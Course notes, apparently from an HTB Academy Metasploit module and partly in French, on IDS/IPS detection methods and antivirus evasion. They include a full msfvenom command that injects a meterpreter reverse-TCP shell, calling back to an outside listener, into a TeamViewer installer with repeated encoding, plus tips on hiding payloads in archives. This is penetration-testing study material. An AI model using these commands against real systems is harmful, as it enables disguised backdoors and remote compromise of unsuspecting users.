---
tags:
  - metasploit
  - ids-ips
  - evasion
  - course/htb-academy
---

| **Security Policy**                         | **Description**                                                                                                                                                                                                                                                                                                                   |
| ------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Signature-based Detection`                 | The operation of packets in the network and comparison with pre-built and pre-ordained attack patterns known as signatures. Any 100% match against these signatures will generate alarms.                                                                                                                                         |
| `Heuristic / Statistical Anomaly Detection` | Behavioral comparison against an established baseline included modus-operandi signatures for known APTs (Advanced Persistent Threats). The baseline will identify the norm for the network and what protocols are commonly used. Any deviation from the maximum threshold will generate alarms.                                   |
| `Stateful Protocol Analysis Detection`      | Recognizing the divergence of protocols stated by event comparison using pre-built profiles of generally accepted definitions of non-malicious activity.                                                                                                                                                                          |
| `Live-monitoring and Alerting (SOC-based)`  | A team of analysts in a dedicated, in-house, or leased SOC (Security Operations Center) use live-feed software to monitor network activity and intermediate alarming systems for any potential threats, either deciding themselves if the threat should be actioned upon or letting the automated mechanisms take action instead. |

- [US Government Post-Mortem Report on the Equifax Hack](https://www.zdnet.com/article/us-government-releases-post-mortem-report-on-equifax-hack/)
- [Protecting from DNS Exfiltration](https://www.darkreading.com/risk/tips-to-protect-the-dns-from-data-exfiltration/a/d-id/1330411)
- [Stopping Data Exfil and Malware Spread through DNS](https://channelpostmea.com/wp-content/uploads/2017/08/infoblox-whitepaper-data-exfiltration-and-dns-closing-the-back-door.pdf)

des liens interessants pour une dns exfiltration par equifax 



## Créer un executable backdooré...!

We are in luck because `msfvenom` offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them (no pun intended), and use `any` executable as a platform from which we can launch our attack. We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances. There are many valid combinations between actual, legitimate executable files, our different encoding schemes (and their iterations), and our different payload shellcode variants. This generates what is called a backdoored executable.

Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file.

```bash
Tximista64@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5 Attempting to read payload from STDIN... Found 1 compatible encoders Attempting to encode payload with 5 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 27 (iteration=0) x86/shikata_ga_nai succeeded with size 54 (iteration=1) x86/shikata_ga_nai succeeded with size 81 (iteration=2) x86/shikata_ga_nai succeeded with size 108 (iteration=3) x86/shikata_ga_nai succeeded with size 135 (iteration=4) x86/shikata_ga_nai chosen with final size 135 Payload size: 135 bytes Saved as: /home/user/Desktop/TeamViewer_Setup.exe`
```
Archiver un payload avec un zip avec mdp permet de le cacher cependant les AV peuvent lancer une alerte, en outre virus total montre qu'un encodage avec zip peu etre retrouvé.

Cela n'est pas le cas avec rar....
